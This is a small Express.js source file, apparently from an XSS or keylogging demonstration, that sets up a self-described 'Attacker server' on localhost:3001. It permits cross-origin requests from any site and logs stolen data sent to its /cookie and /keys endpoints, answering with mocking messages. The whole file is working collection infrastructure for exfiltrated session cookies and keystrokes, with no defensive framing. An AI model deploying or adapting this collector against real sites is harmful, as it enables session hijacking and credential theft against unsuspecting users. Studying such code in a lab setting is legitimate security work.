var express = require('express');
var app = express();

app.use(function(req, res, next) {
	// Allows CORS requests:
	res.header('Access-Control-Allow-Origin', '*');
	next();
});

// get cookie
app.get('/cookie', function(req, res, next) {
	console.log('GET /cookie :: ');
	console.log(req.query.data);
	res.send('Thankyou for the cookie ahahah..');
});

// get keys
app.get('/keys', function(req, res, next) {
	console.log('GET /keys :: ');
	console.log(req.query.data);
	res.send('I\'ll remember this hahaha..');
});

app.listen(3001, function() {
	console.log('"Attacker server" at localhost:3001');
});
